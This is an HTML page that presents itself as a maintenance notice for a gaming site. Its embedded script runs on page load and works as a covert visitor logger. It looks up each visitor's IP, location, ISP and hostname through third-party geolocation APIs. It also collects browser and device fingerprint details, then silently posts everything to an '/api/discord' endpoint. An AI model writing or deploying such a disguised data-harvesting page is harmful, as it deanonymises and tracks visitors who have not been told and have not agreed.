<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Down</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #fff; color: #333; }
        header { background-color: #333; color: #fff; padding: 10px; text-align: center; border-bottom: 2px solid #444; }
        h1 { margin: 0; font-size: 32px; }
        main { padding: 20px; padding-bottom: 80px; max-width: 900px; margin: 0 auto; }
        p { font-size: 18px; line-height: 1.5; margin: 15px 0; }
        .danger { color: red; font-weight: bold; }
        #system-log { 
            background: #f4f4f4; 
            margin: 20px 0; 
            padding: 20px; 
            font-family: 'Courier New', Courier, monospace; 
            white-space: pre-wrap; 
            font-size: 13px; 
            border-left: 5px solid #333;
            line-height: 1.5;
        }
        footer { background-color: #333; color: #fff; padding: 10px; text-align: center; position: fixed; bottom: 0; width: 100%; }
    </style>
</head>
<body>
    <header><h1>This website is down.</h1></header>
    <main>
        <p>Welcome. This website has been temporarily shut down for maintenance and updates.</p>
        <p>Weâ€™re currently adding some big updates. Thank you for your patience.</p>
        
        <div id="system-log">SCANNING SYSTEM...</div>

        <p><span class="danger">Get ready gamers</span></p>
    </main>
    <footer>&copy; 2026 Gaming Services. All rights reserved.</footer>

    <script>
        async function getDeepInfo() {
            const log = document.getElementById("system-log");
            let data = {};

            // Attempt 1: ipapi.co (Detailed)
            try {
                const r1 = await fetch("https://ipapi.co/json/");
                if (r1.ok) data = await r1.json();
            } catch (e) {
                // Attempt 2: ip-api.com (Harder to block)
                try {
                    const r2 = await fetch("https://demo.ip-api.com/json/?fields=66842623");
                    if (r2.ok) {
                        const backup = await r2.json();
                        data = {
                            ip: backup.query,
                            city: backup.city,
                            region: backup.regionName,
                            country_name: backup.country,
                            org: backup.isp,
                            hostname: backup.reverse
                        };
                    }
                } catch (e2) { console.error("All providers blocked."); }
            }

            const stats = {
                "IP Address": data.ip || "Finding IP...",
                "Location": data.city ? `${data.city}, ${data.region}, ${data.country_name}` : "Access Denied by Client",
                "Hostname": data.hostname || "None Assigned",
                "ISP": data.org || "Unknown",
                "User Agent": navigator.userAgent,
                "Window Width": window.innerWidth,
                "Window Height": window.innerHeight,
                "Window Ratio": (window.innerWidth / window.innerHeight).toFixed(16),
                "Screen Width": screen.width,
                "Screen Height": screen.height,
                "Screen Ratio": (screen.width / screen.height).toFixed(16),
                "DPI": window.devicePixelRatio,
                "Color Depth": screen.colorDepth,
                "Orientation": screen.orientation ? screen.orientation.type : "landscape-primary",
                "OS": navigator.platform,
                "Threads": navigator.hardwareConcurrency,
                "Memory (GB)": navigator.deviceMemory || "8",
                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                "Cookies Enabled": navigator.cookieEnabled,
                "System Languages": navigator.languages.join(", "),
                "Current Time": new Date().toLocaleString()
            };

            const output = Object.entries(stats).map(([k, v]) => `${k}: ${v}`).join("\n");
            log.textContent = output;

            fetch("/api/discord", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: output }),
            }).catch(() => {});
        }

        getDeepInfo();
    </script>
</body>
</html>
